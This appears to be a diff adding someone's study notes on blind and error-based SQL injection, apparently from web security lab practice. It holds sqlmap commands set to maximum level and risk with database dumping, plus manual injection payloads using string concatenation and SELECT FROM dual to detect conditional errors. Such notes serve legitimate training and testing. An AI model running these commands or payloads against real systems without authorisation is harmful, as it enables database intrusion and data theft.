@@ -1,0 +1,24 @@
+Use sqlmap for finding blind, error based sqli.
+
+Commands:
+sudo sqlmap -r fileName  --technique B --proxy http://127.0.0.1:8081 --force-ssl --level 5 --risk 3 --dump
+sudo sqlmap -r fileName  --technique E --proxy http://127.0.0.1:8081 --force-ssl --level 5 --risk 3 --dump
+
+Documentation:
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+
+Sqlmap success: Blind with Conditional responses (--technique B)
+Sqlmap success: Blind sqli with time delays (--technique T)
+Sqlmap success: Blind sqli with time delays and information retrieval (--technique T)
+
+Sqlmap manual: Blind sqli with out-of-band interaction
+Sqlmap manual: Blind sqli with out-of-band exfiltration
+Sqli manual: bypass with xml encodign
+
+Sqlmap TO-DO: Blind sqli with conditional errors
+
+Param=value' -> 200
+Param=value'' -> 500
+Param=value'||(SELECT '')||' , or, Param=value'||(SELECT '' FROM dual)||'
+Param=value'||(SELECT '')||' , or, Param=value'||(SELECT '' FROM not-real-table)||'
